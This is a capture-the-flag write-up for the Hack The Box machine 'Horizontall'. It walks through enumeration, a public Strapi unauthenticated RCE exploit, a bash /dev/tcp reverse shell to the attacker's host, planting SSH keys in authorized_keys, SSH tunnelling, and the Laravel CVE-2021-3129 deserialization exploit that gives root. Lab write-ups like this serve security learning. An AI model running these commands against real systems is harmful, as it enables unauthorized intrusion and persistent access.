---
title: "HTB - Horizontall"
author: [0x3ds]
date: 2025-10-21 01:00:00 +1000
description: "Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the Strapi Headless CMS which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the strapi user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as root."
categories: [Hack The Box, Machines - Linux]
tags: [htb-blue, blue, hackthebox, machine, ctf, linux, easy, nmap, gobuster, ffuf, source-code, vhosts, strapi, cve-2019-18818, cve-2019-19609, CVE-2021-3129, command-injection, burp, burp-repeater, laravel, phpggc, deserialization]
image:
  path: /assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_infocard.png
cover: /assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_infocard.png
---

## User Flag
---
### Initial Enumeration

We can start out by using the `nmap` tool to perform a port scan in an attempt to try and identify if there are any open ports on the target host.

```zsh
0x3ds@kali $ sudo nmap 10.129.235.221 -sV -sC -T4 -p-

Nmap scan report for 10.129.235.221
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.26 seconds
```

We can see that we have discovered two open TCP ports:
- TCP Port 22 - SSH
- TCP Port 80 - HTTP

We can see in the output that we have a domain name - http://horizontall.htb - we can add this to our host files.

```zsh
0x3ds@kali $ echo "10.129.235.221  horizontall.htb" | sudo tee -a /etc/hosts

10.129.235.221  horizontall.htb
```


We can now navigate to the website at http://horizontall.htb/:

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_1.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_1.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Taking a look around the site, we are unable to immediately identify anything of interest.

We can perform further enumeration by attempting to brute force directories using `gobuster` in an attempt to see if we are able to find anything interesting.

```zsh
0x3ds@kali $ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirb/common.txt --no-error

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/favicon.ico          (Status: 200) [Size: 4286]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```


Unfortunately, this did not return anything very interesting.

We can perform additionally enumeration by attempting to perform vhost discovery to identify further subdomains using `ffuf`:

```zsh
0x3ds@kali $ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://10.129.235.221 -H 'Host:FUZZ.horizontall.htb' -fs 194

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.235.221
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 194
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 38ms]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 56ms]
:: Progress: [114442/114442] :: Job [1/1] :: 1030 req/sec :: Duration: [0:01:45] :: Errors: 0 ::
```


We can see in the output that we have a domain name - http://horizontall.htb - we can add this to our host files.

```zsh
0x3ds@kali $ echo "10.129.235.221 api-prod.horizontall.htb" | sudo tee -a /etc/hosts

10.129.235.221 api-prod.horizontall.htb
```

e can now navigate to the website at http://horizontall.htb/:

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_2.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_2.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


As we can see this takes us to a simple page with a welcome message.

We can again perform further enumeration by attempting to brute force directories using `gobuster` in an attempt to see if we are able to find anything interesting this time.

```zsh
0x3ds@kali $ gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirb/common.txt --no-error

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Admin                (Status: 200) [Size: 854]
/admin                (Status: 200) [Size: 854]
/ADMIN                (Status: 200) [Size: 854]
/favicon.ico          (Status: 200) [Size: 1150]
/index.html           (Status: 200) [Size: 413]
/reviews              (Status: 200) [Size: 507]
/robots.txt           (Status: 200) [Size: 121]
/users                (Status: 403) [Size: 60]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

This returns a few very interesting looking results that we can investigate further and see what we find.

When we attempt to navigate to the `/admin` directory (http://api-prod.horizontall.htb/admin/auth/login), we are met with a login page:

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_3.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_3.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


A little bit of research led me to a [**post**](https://forum.strapi.io/t/strapi-plugin-bootstrap-admin-user/1106) that mentioned the default credentials for strapi, these are `admin`:`admin`. However, trying this yielded me no further success. 

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_4.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_4.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


---
### Vulnerability Analysis

We can utilise `searchsploit` to try and find if there are any public exploits available that we may be able to then take a look if we could use any of them.

```zsh
0x3ds@kali $ searchsploit "strapi"

-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                        | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)      | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)| multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)  | nodejs/webapps/50716.rb
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
From the output we are able to see that there are 3 unauthenticated exploits publicly available across different versions. We need to be able to identify the version of strapi first.


Some quick research online led me to find a [**post**](https://strapi.io/blog/admin-permissions) about the strapi admin panel, within it mentioning a very interesting directory, `/admin/strapiVersion`. We can attempt to access this and see if we are able to identify the version running.

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_5.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_5.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

As we can see we have been able to identify that the version of strapi is `3.0.0-beta.17.4`.


Now that we know the version, we can select the correct exploit to use. In this case we will select `Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)` (50239.py). We can now mirror the exploit file by using the `-m` flag with `searchsploit` followed by the exploit's ID.

```zsh
0x3ds@kali $ searchsploit -m 50239

  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50239
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/0x3ds/htb/labs/machines/horizontall/50239.py
```

---
### Exploitation

With the exploit now in our current working directory and after reading through it to understand what it does, we can go ahead and execute it by passing the URL of the target as an argument.

```zsh
0x3ds@kali $ python3 50239.py http://api-prod.horizontall.htb

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit
[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzYwOTY2MjE3LCJleHAiOjE3NjM1NTgyMTd9.4YCpfiAcFLF7FwfFoxsqqDqiVb_b9dKiCNbZEkfU4EY
```

From the output we can see that the exploit was executed successfully and the password for the admin user was reset. We now have the credentials:\
`admin`:`SuperStrongPassword1`


---
### Post Exploitation

Further, since this was a Remote Code Execution (RCE) exploit, we can now use the shell to attempt executing commands on the target host.

```zsh
$> whoami

[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```

Unfortunately it appears that any commands we run are not actually working.

We can attempt to execute a reverse shell command to try and obtain a shell using netcat. Given this is a linux machine, we can try to use a simple bash reverse shell one-liner from [**PayloadsAllTheThings**](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp).

However, first we need to set up our listener using `netcat`

```zsh
0x3ds@kali $ nc -lvnp 9001

listening on [any] 9001 ...
```

With our listener set up, we can now execute our reverse shell command.

```zsh
$>  bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'

[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
_
```

This resulted in our shell hanging. We can now return to our `netcat` listener and see below that we have obtained a more stable reverse shell connection with the target!

```zsh
0x3ds@kali $ nc -lvnp 9001

listening on [any] 9001 ...
...

connect to [10.10.14.8] from (UNKNOWN) [10.129.235.221] 52316
bash: cannot set terminal process group (1963): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```

We can now upgrade our shell with another simple one-liner:
```zsh
strapi@horizontall:~/myapi$ python -c 'import pty;pty.spawn("/bin/bash")'

python -c 'import pty;pty.spawn("/bin/bash")'
```

Now we can begin to perform post exploitation and enumerate the target host further. 


After some further enumeration, we are able to find some interesting files in the `/home/developer` directory:
```zsh
strapi@horizontall:~/myapi$ ls -l /home/developer

ls -l /home/developer
total 68
-rw-rw----  1 developer developer 58460 May 26  2021 composer-setup.php
drwx------ 12 developer developer  4096 May 26  2021 myproject
-r--r--r--  1 developer developer    33 Oct 20 11:42 user.txt
```

We can see that we have identified the `user.txt` flag. We can attempt to read the contents of it to obtain the flag

```zsh
strapi@horizontall:~/myapi$ cat /home/developer/user.txt

cat /home/developer/user.txt
093fd***************************
```
From this we have been able to successfully obtain the `user.txt` flag!

> **Answer: `093fd***************************`**
{: .prompt-tip }



## Root Flag
---
### Initial Enumeration


We can continue to perform enumeration on the target host to see if there are any further ways in which we can look to move laterally or escalate our privileges.

```zsh
strapi@horizontall:~/myapi$ netstat -tunlp

netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1963/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

When enumerating if there are any services that are only accessibly locally, we are able to see that there are a few interesting ones.
- MySQL on TCP/3306
- HTTP on TCP/80
- SSH on TCP/22
- Node on TCP/1337
- Something on TCP/8000 -> Investigate.

To find our what is on TCP/8000, we can try to interact with it via our reverse shell to see if we need to perform additional actions.

```zsh
strapi@horizontall:~/myapi$ curl -I http://127.0.0.1:8000

curl -I http://127.0.0.1:8000
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Mon, 20 Oct 2025 14:04:08 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Mon, 20 Oct 2025 14:04:08 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6I<SNIP>iZmQ4In0%3D; expires=Mon, 20-Oct-2025 16:04:08 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6I<SNIP>YTFkIn0%3D; expires=Mon, 20-Oct-2025 16:04:08 GMT; Max-Age=7200; path=/; httponly; samesite=lax
```

We can see from the output that it is a HTTP site. Additionally, we are able to see the cookie `laravel_session` being set, which gives us an indication that Laravel - a free and open-source PHP-based web framework for building web applications - may be hosted on the site.


To access the site, we will need to either create a tunnel or port forward. Since we know that TCP port 22 (SSH) is up and accessible, we can simply perform SSH port forwarding. However, first we need to generate a SSH key pair.

```zsh
0x3ds@kali $ ssh-keygen -f key

Generating public/private ed25519 key pair.
Enter passphrase for "key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:cFnrrR2POooD7hOUrxpt05qfyav2lFrm4XjZBh7Tby0 0x3ds@kali
The key's randomart image is:
+--[ED25519 256]--+
|          .      |
|         o .     |
|     .. o .      |
|    o  o . .     |
|   . . .S . o    |
|   .o.=..  o +   |
|  ..+=B* ...o .  |
|   o=&==o E..    |
|  .+B*@+.o.o     |
+----[SHA256]-----+
```

This generated two files (SSH key pair):
1. **`key`** (which we will use with ssh -i), and;
2. **`key.pub`** (which we will copy to contents of into the 'authorized_keys' file on the target).

We can copy the contents of the `key.pub` file and return to the reverse shell we have. We now need to navigate to the home directory of the user we are in control of and create a `.ssh/` directory since one does not already exist.

```zsh
strapi@horizontall:~/myapi$ cd ~ && mkdir .ssh && cd .ssh

cd ~ && mkdir .ssh && cd .ssh
```

Now that we are in the `.ssh/` directory, we can take the copied contents from the `key.pub` file and echo them into a new file called `authorized_keys`. 

```zsh
strapi@horizontall:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1wvYwG+QR1uch2fPqaDaRbz6A1DWxVaa7QySQhNGZR 0x3ds@kali' > authorized_keys

<z6A1DWxVaa7QySQhNGZR 0x3ds@kali' > authorized_keys
```


We can now return to our local machine use the `key` file from the SSH key pair to connect to the target host via SSH as well as port forward TCP/8000

```zsh
0x3ds@kali $ ssh -L 8000:127.0.0.1:8000 strapi@10.129.235.221 -i key

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
<SNIP>
```

Now that we have successfully port forwarded the TCP Port 8000 to our local machine, we can attempt to access it by opening our browser and navigating to `127.0.0.1:8000`

![light mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_6.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/linux/easy/horizontall/horizontall_6.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

We are able to see that we have indeed got a Laravel site that is running version 8 as per the bottom right hand side of the site.


---
### Vulnerability Analysis


Since we know the version of Laravel that is running, we can again utilise `searchsploit` to try and see if we are able to identify any publicly available exploits we may be able to use.

```zsh
0x3ds@kali $ searchsploit "laravel 8"

------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Laravel - 'Hash::make()' Password Truncation Security                                | multiple/remote/39318.txt
Laravel 8.4.2 debug mode - Remote code execution                                     | php/webapps/49424.py
Laravel Log Viewer < 0.13.0 - Local File Download                                    | php/webapps/44343.py
Laravel Nova 3.7.0 - 'range' DoS                                                     | php/webapps/49198.txt
PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forgery (CSRF) | php/webapps/50525.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We are able to see that there is a exploit listed in the results for version 8.4.2: `Laravel 8.4.2 debug mode - Remote code execution`. 

We can read the first few lines of the exploit file `49424.py` to see if there is any further information that may assist us with identifying if this exploit would be applicable with the version of Laravel we are up against.

```zsh
0x3ds@kali $ head /usr/share/exploitdb/exploits/php/webapps/49424.py

# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
# Date: 1.14.2021
# Exploit Author: SunCSR Team
# Vendor Homepage: https://laravel.com/
# References:
# https://www.ambionics.io/blog/laravel-debug-rce
# https://viblo.asia/p/6J3ZgN8PKmB
# Version: <= 8.4.2
# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce
```

We are able to see that it is mentioned that the exploit works against Laravel that is `Version <= 8.4.2` which means that our version is within scope. Upon further research of this vulnerability, I was able to locate the original post discussing `CVE-2021-3129` by [**Charles Fol**](https://blog.lexfo.fr/laravel-debug-rce.html).

Some additional research led me to find a few proof of concepts, with the follow [**POC**](https://github.com/nth347/CVE-2021-3129_exploit) being very easy to use.

```zsh
0x3ds@kali $ git clone https://github.com/nth347/CVE-2021-3129_exploit.git && cd CVE-2021-3129_exploit

Cloning into 'CVE-2021-3129_exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.
```

---
### Exploitation

We can now go ahead and follow the usage steps outlined in the GitHub POC post.

```zsh
0x3ds@kali $ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 id

[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

And *voila*, we are able to execute commands on the target host as the `root` user!



---
### Post Exploitation

We can use this to put our public key contents from our SSH key pair we generated earlier into the `authorized_keys` file within the `.ssh/` directory of the root user. This would allows us to then access the target host as the root user via SSH.

First, we need to copy the contents from our `key.pub` file we generated earlier and prepare our command.

```zsh
0x3ds@kali $ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1wvYwG+QR1uch2fPqaDaRbz6A1DWxVaa7QySQhNGZR 0x3ds@kali" >> ~/.ssh/authorized_keys'

[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output
[i] Trying to clear logs
[+] Logs cleared
```

Since there is no output confirming if it was successful, we can run another command to read the contents of the `~/.ssh/authorized_keys` file to see if it was successfully echoed into it or not.

```zsh
0x3ds@kali $ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 'cat  ~/.ssh/authorized_keys'

[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1wvYwG+QR1uch2fPqaDaRbz6A1DWxVaa7QySQhNGZR 0x3ds@kali

[i] Trying to clear logs
[+] Logs cleared
```

We can see that it was successful!

Our next step is to simply SSH into the target host as the root user using our `key` file from the SSH key pair we generated earlier.

```zsh
0x3ds@kali $ ssh -i key root@10.129.235.221

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
<SNIP>
Last login: Mon Aug 23 11:43:44 2021 from 10.10.14.6
root@horizontall:~#
```

Now that we have compromised the `root` account, we can perform any post exploitation activities we wish.

After enumerating the target host further, we are able to locate the `root.txt` flag! 

```zsh
root@horizontall:~# ls -l

total 16
-rwxr-xr-x 1 root root 185 May 28  2021 boot.sh
-rw-r--r-- 1 root root   6 Oct 20 15:10 pid
-rw-r--r-- 1 root root 384 Jul 29  2021 restart.sh
-r-------- 1 root root  33 Oct 20 11:42 root.txt
```

We can attempt to read the contents of the file to obtain the flag

```zsh
0x3ds@kali $ cat root.txt

c691a***************************
```

From this we have been able to successfully obtain the `root.txt` flag!

> **Answer: `c691a***************************`**
{: .prompt-tip }
